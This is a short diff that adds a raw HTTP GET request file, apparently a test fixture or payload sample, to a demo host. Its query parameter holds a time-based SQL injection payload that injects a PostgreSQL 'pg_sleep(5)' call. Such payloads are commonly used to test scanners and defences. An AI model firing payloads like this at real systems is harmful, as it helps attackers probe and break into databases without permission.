@@ -1,0 +1,4 @@
+GET /a?cmd=1);%0aselect%0apg_sleep(5)-- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
